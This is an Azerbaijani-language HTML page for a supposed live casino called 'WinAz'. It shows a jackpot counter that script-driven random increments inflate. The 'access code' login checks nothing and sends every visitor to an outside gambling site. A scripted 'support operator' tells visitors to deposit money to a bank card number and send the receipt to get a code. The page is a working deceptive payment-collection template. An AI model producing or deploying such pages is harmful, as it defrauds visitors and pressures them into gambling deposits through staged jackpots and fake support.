<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WinAz - Canlı Kazino</title>
    <style>
        @charset "utf-8";
        
        * { box-sizing: border-box; }

        body, html {
            height: 100%; width: 100%; margin: 0; padding: 0;
            background: #000;
            font-family: 'Segoe UI', Arial, sans-serif;
            color: #fff;
            overflow-x: hidden; /* Sağ tərəfə sürüşməni bağlayır */
        }

        .bg-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at center, #1a1a1a 0%, #000 90%);
            z-index: -1;
        }

        /* JACKPOT - Mobil üçün kiçildildi */
        #jackpotCont {
            position: absolute;
            top: 10px;
            width: 100%;
            text-align: center;
            z-index: 20;
        }

        .jackpot-box {
            display: inline-block;
            background: rgba(255, 215, 0, 0.1);
            padding: 5px 20px;
            border-radius: 50px;
            border: 2px solid #ffd700;
        }

        .jackpot-amount {
            font-size: clamp(24px, 8vw, 42px); /* Ekran ölçüsünə görə dəyişir */
            font-weight: 900;
            color: #fff;
            text-shadow: 0 0 15px #ffd700;
        }

        /* LOGO - Mobil üçün mütənasib */
        .brand-container {
            margin-top: 80px;
            text-align: center;
        }

        .brand-header {
            font-size: clamp(40px, 12vw, 80px);
            font-weight: 900;
            color: #fff;
            text-transform: uppercase;
            letter-spacing: 5px;
            animation: neonGlow 1.5s ease-in-out infinite alternate;
        }

        @keyframes neonGlow {
            from { text-shadow: 0 0 10px #fff, 0 0 20px #ffd700; }
            to { text-shadow: 0 0 20px #fff, 0 0 30px #ff8c00; }
        }

        /* WRAPPER VƏ PANEL - Əsas Düzəliş Buradadır */
        #wrapper {
            width: 100%;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            min-height: 80vh;
        }

        #codeFormWr {
            background: url("online555logo.png") no-repeat center;
            background-size: contain; /* Şəkil qutunun içinə sığır */
            width: 100%;
            max-width: 500px; /* Kompüterdə çox böyüməsin */
            height: 200px;
            position: relative;
        }

        #codeFormCont {
            background: url("login-panel-back.png") repeat;
            background-size: cover;
            width: 95%;
            max-width: 400px;
            height: auto;
            min-height: 120px;
            margin: 0 auto;
            position: relative;
            bottom: -20px; /* Mobil üçün aşağıdan məsafə */
            border-radius: 15px;
            border: 1px solid rgba(255, 215, 0, 0.4);
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        /* Daxiletmə sahələri mobil üçün alt-alta və ya uyğun */
        #codeFldLbl {
            color: #fff;
            font: bold 18px Tahoma;
            margin-bottom: 10px;
            text-align: center;
        }

        .input-group {
            display: flex;
            align-items: center;
            gap: 5px;
            width: 100%;
            justify-content: center;
        }

        #codeFld {
            background: url("code-field-back.png") no-repeat center;
            background-size: 100% 100%;
            border: none;
            color: #000;
            height: 40px;
            width: 180px;
            outline: none;
            font-size: 20px;
            text-align: center;
            font-weight: bold;
        }

        #submitBtn {
            background: url("log-btn.png") no-repeat center;
            background-size: contain;
            border: 0;
            cursor: pointer;
            height: 40px;
            width: 70px;
            color: #fff;
            font-weight: bold;
            font-size: 14px;
        }

        /* CANLI DƏSTƏK - Mobil üçün kiçik düymə */
        #supportBtn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 60px;
            height: 60px;
            background: radial-gradient(circle, #ffd700, #ff8c00);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1001;
            animation: pulseSupport 1.5s infinite;
        }

        .support-label {
            position: absolute;
            right: 70px;
            background: #fff;
            color: #000;
            padding: 5px 10px;
            border-radius: 8px;
            font-weight: bold;
            font-size: 11px;
            white-space: nowrap;
        }

        @keyframes pulseSupport {
            0% { box-shadow: 0 0 0 0 rgba(255, 215, 0, 0.7); }
            70% { box-shadow: 0 0 0 15px rgba(255, 215, 0, 0); }
            100% { box-shadow: 0 0 0 0 rgba(255, 215, 0, 0); }
        }

        /* ÇAT PƏNCƏRƏSİ - Mobildə ekranı örtməsin */
        #chatBox {
            position: fixed; bottom: 90px; right: 10px; width: 300px;
            max-width: 90vw;
            background: #fff; border-radius: 15px; border: 2px solid #ffd700;
            display: none; flex-direction: column; z-index: 1000;
        }

        .chat-body { padding: 10px; background: #f1f1f1; height: 250px; overflow-y: auto; color: #333; font-size: 13px; }
        .card-no { background: #000; color: #ffd700; padding: 5px; text-align: center; border-radius: 5px; font-family: monospace; font-size: 14px; margin-top: 5px;}
    </style>
</head>
<body>

<div class="bg-overlay"></div>

<div id="jackpotCont">
    <div class="jackpot-box">
        <div class="jackpot-amount">₼ <span id="jackpotNum">150.00</span></div>
    </div>
</div>

<div id="wrapper">
    <div class="brand-container">
        <h1 class="brand-header">WinAz</h1>
    </div>

    <div id="codeFormWr">
        <div id="codeFormCont">
            <div id="codeFldLbl">Giriş Kodu:</div>
            <form id="loginForm" class="input-group">
                <input type="text" id="codeFld" placeholder="" autocomplete="off" required>
                <button type="submit" id="submitBtn">GİRİŞ</button>
            </form>
        </div>
    </div>
</div>

<div id="supportBtn" onclick="toggleChat()">
    <div class="support-label">Kod almaq üçün kliklə!</div>
    <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
</div>

<div id="chatBox">
    <div style="background:#ffd700; color:#000; padding:10px; font-weight:bold; display:flex; justify-content:space-between;">
        <span>WinAz Dəstək</span>
        <span onclick="toggleChat()" style="cursor:pointer">✕</span>
    </div>
    <div class="chat-body">
        <div><strong>Operator:</strong> Salam! Kod üçün depozit edib qəbzi göndərin.</div>
        <div class="card-no">4169 7388 0000 0000</div>
    </div>
</div>

<script>
    let amount = 150.00;
    setInterval(() => {
        if (amount < 400) {
            amount += (Math.random() * 0.1);
            document.getElementById('jackpotNum').innerText = amount.toFixed(2);
        }
    }, 100);

    function toggleChat() {
        const chat = document.getElementById('chatBox');
        chat.style.display = (chat.style.display === 'flex') ? 'none' : 'flex';
    }

    document.getElementById('loginForm').addEventListener('submit', (e) => {
        e.preventDefault();
        window.location.href = "https://fastloto365.com";
    });
</script>

</body>
</html>
